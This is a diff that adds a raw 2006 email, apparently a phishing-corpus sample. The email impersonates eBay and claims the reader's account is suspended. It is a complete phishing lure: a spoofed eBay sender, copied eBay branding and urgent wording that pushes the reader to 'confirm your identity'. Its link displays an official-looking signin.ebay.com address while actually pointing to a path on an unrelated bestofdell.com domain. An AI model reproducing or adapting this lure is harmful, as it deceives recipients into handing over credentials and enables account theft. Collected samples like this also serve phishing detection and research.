@@ -1,0 +1,98 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <titab@server.1a-consultants.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id D639E469E2
+ for <user@login.example.com>; Tue,  5 Dec 2006 15:35:24 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id C1928131FFAB
+ for <user@example.com>; Tue,  5 Dec 2006 15:35:24 -0500 (EST)
+Received: from server.1a-consultants.com (server.1a-consultants.com
+ [209.51.138.210])
+ by mail.example.org (Postfix) with ESMTP id C40916FA1C1
+ for <user@example.com>; Tue,  5 Dec 2006 15:35:24 -0500 (EST)
+Received: from titab by server.1a-consultants.com with local (Exim 4.52)
+ id 1Grh0O-0005EB-8Q
+ for user@example.com; Tue, 05 Dec 2006 22:35:08 +0200
+To: user@example.com
+Subject: eBay Suspension - User Agreement - Abusing eBay
+From: eBay <aw-confirm@eBay.com>
+Reply-To: no-reply@eBay.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1Grh0O-0005EB-8Q@server.1a-consultants.com>
+Date: Tue, 05 Dec 2006 22:35:08 +0200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.1a-consultants.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [32018 500] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.1a-consultants.com
+X-Source: /usr/bin/php
+X-Source-Args: /usr/bin/php index.php 
+X-Source-Dir: titab.com:/public_html/y
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 481
+
+<P>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG alt=eBay src="http://pics.ebaystatic.com/aw/pics/logos/ebay_95x39.gif" border=0></TD>
+<TD vAlign=bottom><FONT face="verdana, sans-serif" color=#666666 size=1><B>eBay sent this message to your registered email address.<A href="http://pages.ebay.com/help/confidence/name-userid-emails.html">Learn more</A>. </FONT></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffe680 border=0>
+<TBODY>
+<TR>
+<TD vAlign=top width=8><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/globalAssets/ltCurve.gif" width=8></TD>
+<TD vAlign=bottom width="100%">
+<H1 style="MARGIN-TOP: 2px; FONT-WEIGHT: bold; FONT-SIZE: 14pt; MARGIN-BOTTOM: 2px; COLOR: #000000; FONT-FAMILY: arial,"><FONT face="Arial, Verdana" size=4><B>FPA NOTICE: eBay Suspension - User Agreement - Abusing eBay</B></FONT></H1></TD>
+<TD vAlign=top align=right width=8><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/globalAssets/rtCurve.gif" width=8 align=top></TD></TR>
+<TR>
+<TD bgColor=#ffcc00 colSpan=3 height=4><SPACER height="4" type="block" width="1"></SPACER></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=5></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="BORDER-RIGHT: #ffcc00 1px solid; BORDER-LEFT: #ffcc00 1px solid; BORDER-BOTTOM: #ffcc00 1px solid" width="100%" border=0>
+<TBODY>
+<TR>
+<TD style="PADDING-LEFT: 8px"><FONT face="Arial, Verdana" size=2>Dear eBay Member,<BR><BR>We regret to inform you that your eBay account has been suspended due to concerns we have for the safety of the eBay Community.<BR><BR>Due to the suspension of your account , please be advised that you are prohibited from using eBay in any way.<BR>This includes the registering of a new account .To confirm that you are the righfull owner of this account , please confirm your identity signing and resolving this dispute at : <BR><BR><A href="http://bestofdell.com/it/%20%20%20%20/ws/ebay-account/eBayISAPI.dllSignIn.php" target="">https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&CaseID1402Dispute#1402</A><BR><BR><BR>Why is my account suspended?<BR><BR>We have reason to believe that your account was accessed by a third party.<BR><BR>Because protecting the security of your account is our primary concern, we have suspended your eBay account.<BR><BR>We understand that this may be an inconvenience 
+ but please understand that this temporary suspension is for your protection.<BR><BR>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD vAlign=top align=left width="100%">
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD vAlign=top align=left width="100%">
+<P><FONT face="Arial, Verdana" size=2>Thank you,<BR>eBay </FONT></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#ffffff colSpan=2><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#cecee3 colSpan=2><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#ffffff colSpan=2><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD colSpan=2>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1>Learn how you can protect yourself from spoof (fake) emails at: <BR><A href="http://pages.ebay.com/education/spooftutorial" target=_blank rel=nofollow _><FONT color=#003399>http://pages.ebay.com/education/spooftutorial</FONT></A><BR><BR>If you would like to receive this email in text format, change your <A href="http://cgi4.ebay.co.uk/ws/eBayISAPI.dll?OptinLoginShow" target=_blank rel=nofollow _><FONT color=#003399>notification preferences</FONT></A>. <BR><BR>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies. <BR>Privacy Policy: <A href="http://pages.ebay.com/help/policies/privacy-policy.html" target=_blank rel=nofollow _><FONT color=#003399>http://pages.ebay.com/help/policies/privacy-policy.html</FONT></A><BR>User Agreement: <A href="http://pages.ebay.com/help/policies/user-agreement.html" target=_blank rel=nofollow _><FONT color=#003399>http://pages.ebay.com/help/policies/
+ user-agreement.html</FONT></A><BR><BR>Copyright © 2006 eBay, Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P>
+
+
